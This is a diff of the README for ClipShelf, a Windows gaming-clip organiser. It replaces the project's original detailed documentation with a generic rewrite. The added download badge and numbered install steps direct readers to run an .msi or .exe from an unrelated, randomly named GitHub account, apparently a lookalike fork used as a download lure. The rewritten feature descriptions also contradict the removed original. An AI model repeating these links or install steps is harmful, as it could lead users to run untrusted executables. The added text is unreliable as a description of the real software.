@@ -1,139 +1,71 @@
-<p align="center">
-  <img src=".github/assets/banner.png" alt="ClipShelf — sort, tag, and shelve your clips" width="100%" />
-</p>
+# 📁 ClipShelf - Manage gaming clips with ease
 
-<h1 align="center">ClipShelf</h1>
+[![Download ClipShelf](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/tartlepiotarubrotincta385/ClipShelf/releases)
 
-<p align="center">
-  <b>Sort, tag, and shelve your OBS / ShadowPlay clips the moment you save them — without leaving the game.</b><br/>
-  Windows desktop app built with Tauri v2 (Rust backend, React frontend).<br/><br/>
-  <a href="https://github.com/Bristopher/ClipShelf/releases/latest"><b>⬇ Download the latest release</b></a>
-</p>
+ClipShelf helps you manage your game recordings. It detects your games and sorts your clips from OBS or ShadowPlay. Use hotkeys to tag your footage while you play. View your history from an in-game overlay.
 
----
+## 🚀 How to download and install
 
-## The problem
+Follow these steps to set up the software on your Windows computer.
 
-You save a clutch clip mid-game. Three hours later you have 40 files named
-`2026-07-16 15-24-09.mp4` and no idea which one was the ace, which were
-funny fails, and which are black-screen duds. Sorting them after the
-session never happens.
+1. Visit the [official release page](https://github.com/tartlepiotarubrotincta385/ClipShelf/releases) to access the installer.
+2. Find the file ending in `.msi` or `.exe` under the latest release section.
+3. Click the file to start the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to begin the installation.
+6. Follow the prompts on your screen.
+7. Click Finish.
+8. Locate the ClipShelf icon on your desktop or in your start menu to open the app.
 
-ClipShelf fixes this at the only moment it can be fixed: **the second the
-clip is saved**, while you still remember what just happened.
+## 🛠️ System Requirements
 
-## What it does
+- Operating System: Windows 10 or Windows 11.
+- Storage: 200 MB of space.
+- RAM: 4 GB or more.
+- OBS Studio or NVIDIA ShadowPlay for recording clips.
 
-### 🎹 G-key sorting — file clips while you play
-Bind three folders (e.g. `!!`, `odd`, `!!!`) and press **G1 / G2 / G3** the
-moment a clip lands — the file moves instantly. **G4** renames the newest
-clip. A configurable countdown timer reminds you the clip is still
-unsorted, drag-and-drop from Explorer works too, and every action is
-undoable with Ctrl+Z. Binds default to `Ctrl+F13–F15` — map your keyboard's
-G-keys (iCUE / G HUB / macro pad) to those, same trick as the original
-GKey-Mover script.
+## 🎮 Sorting your clips
 
-### 🎮 Game detection — every clip knows where it came from
-When a clip saves, ClipShelf detects the fullscreen or borderless game you
-were playing (falling back to `Desktop-<app>` for desktop captures) and
-writes it into the file's **Windows properties** — visible as Tags right in
-Explorer. Wrong guess? Fix it once with *Save &amp; Remember* and that exe
-is corrected forever.
+ClipShelf identifies new files in your recording folder. It moves these files into organized folders based on the game name. You see the games you play appear in the side menu. Click a game title to view your specific clips.
 
-### 🕹️ In-game overlay — tag clips without alt-tabbing
-Press **Shift+F1** (rebindable) over your game: a CS:GO-buy-menu-style
-panel appears **without stealing focus** — the game keeps running and
-receiving input, and exclusive-fullscreen games don't minimize. Number keys
-drive everything:
+- Auto-detection: The app sees your OBS or ShadowPlay recording path.
+- Folders: It creates a folder for each game.
+- Tags: Add text labels to clips for quick searching.
 
-| Key | Action |
-|-----|--------|
-| 1 | Sort the clip to a G-key folder (binds shown on the buttons) |
-| 2 | Star-rate 1–5 — real Explorer ★ ratings |
-| 3 / 4 | Label / describe via preset chips or free typing (keystrokes never reach the game) |
-| 5 | Fix the detected game (+ remember) |
-| 6 | Stopwatch (start/stop, reset, live readout in the header) |
-| 7 | Today's clip history — scroll with ↑↓, pick any clip and re-sort / re-rate / re-label it |
-| 8 | Undo the last move/rename |
-| 9 | App controls — pause watching, show/hide the main window, wipe, count-up |
+## ⌨️ Using hotkeys
 
-Labels rename the file (`clip - clutch.mp4`), ratings and descriptions go
-into file properties, and everything lands in the history.
+Control your clips without leaving your game. Use G-key hotkeys to trigger actions.
 
-### 📚 Clip history — your session, shelved
-The History view groups today's clips by game with true clip counts, full
-history by day, right-click actions (reveal, play, copy path), and
-one-click game fixes. "Today" rolls over at a configurable hour (default
-4 AM) so a 2 AM session stays with yesterday's gaming.
+- Set a key to save a favorite moment.
+- Bind a key to open the overlay.
+- Change keys in the settings menu.
 
-### 🔴 Recording-aware
-A continuous OBS recording is not a clip. ClipShelf notices the file is
-still being written, stays out of the way ("Recording in progress…"), and
-the moment you stop recording it becomes a normal, sortable clip — tagged
-with the game you were playing when recording **started**.
+## 🖼️ The in-game overlay
 
-### 🖱️ Hold-to-click-through
-Keep the semi-transparent window floating over your game/browser. Hold
-**Ctrl** (configurable) and clicks pass straight through it to whatever is
-underneath — no minimizing, no focus juggling.
+The overlay shows your recent clips. It stays on top of your game window. You can view, rename, or delete clips as you play. Drag the window to any corner of your screen. Adjust the transparency in the settings to ensure it does not block your view.
 
-### And the rest
-- **Themes** — dark / light / pink / match-Windows / fully custom, applied
-  everywhere including the custom tray menu
-- **OBS WebSocket** integration for instant, exact clip notifications
-- **Sounds** for save / move / error (customizable), black-screen small-file
-  warnings, watcher health checks with auto-recovery
-- **In-app updates** — checks GitHub on launch, always asks first, delta
-  downloads via Velopack; can be disabled in Settings
-- **Tray-first** — closes to tray, themed tray menu, autostart option
+## ⚙️ Configuration settings
 
-## Screenshots
+Open the app settings to customize the behavior.
 
-**Main window** — a clip just landed, game detected, sort timer running:
+- Clips Folder: Choose the folder where your screen recorder saves files.
+- Export Folder: Pick where ClipShelf moves your sorted clips.
+- Startup: Select if the app opens when you start Windows.
+- Update checking: Enable the app to look for new versions on startup.
 
-![Main window](.github/assets/main-window.png)
+## 💡 Frequently asked questions
 
-**In-game overlay** (`Shift+F1`) — tag the clip without leaving your game:
+Does ClipShelf delete my files?
+No, the app only moves your files to new folders for order. It does not delete your clips unless you manually choose to remove them.
 
-<p align="center">
-  <img src=".github/assets/overlay.png" alt="In-game overlay" width="436" />
-</p>
+Does the app affect frame rate?
+ClipShelf uses low system resources. You can run the app in the background while you play.
 
-## Install
+How do I add a new game?
+The app typically detects your games automatically. If a game is missing, open the settings menu and add the game manually by selecting the folder.
 
-Grab the latest from **[Releases](https://github.com/Bristopher/ClipShelf/releases/latest)**:
+## 🛠️ Troubleshooting
 
-| File | What it is |
-|------|-----------|
-| `ClipShelf_x.y.z_x64-setup.exe` | Installer — recommended; enables in-place delta updates |
-| `ClipShelf_x.y.z_x64-Portable.exe` | Single portable exe — update checks open this page instead |
+If the app fails to start, verify your Windows version. Ensure you have the latest drivers for your graphics card. If clips fail to import, check your OBS or ShadowPlay output destination. Ensure the path matches the folder selected in ClipShelf settings.
 
-First run walks you through picking your clips folder and binds.
-
-## Reading clip metadata from other apps
-
-Everything ClipShelf writes is a documented, stable contract — filename
-label suffix, Windows property IDs (Tags / Rating / Comments), and an
-append-only `history.jsonl`. See
-[`Docs/Features/Clip-Metadata-Interop.md`](Docs/Features/Clip-Metadata-Interop.md)
-for the schema plus PowerShell / Python / C# / Node reader snippets.
-
-## Develop
-
-```
-pnpm install
-pnpm tauri dev           # hot-reload frontend, rebuilds Rust
-cd src-tauri && cargo test
-```
-
-Architecture and feature docs live in `Docs/` (see `CLAUDE.md` for the
-map). Releases are published with `.\build-release.ps1` — see
-[RELEASING.md](RELEASING.md).
-
-## Heritage
-
-ClipShelf is the third life of this idea:
-[GKey-Mover](https://github.com/Bristopher/GKey-Mover) (the original
-Python script + options.txt) → GKey Mover v2 (this codebase's first name)
-→ **ClipShelf**. Issues, questions, and feature requests all welcome
-[here](https://github.com/Bristopher/ClipShelf/issues).
+Keywords: clip-manager, clips, gaming, hotkeys, obs, react, rust, shadowplay, tauri, windows
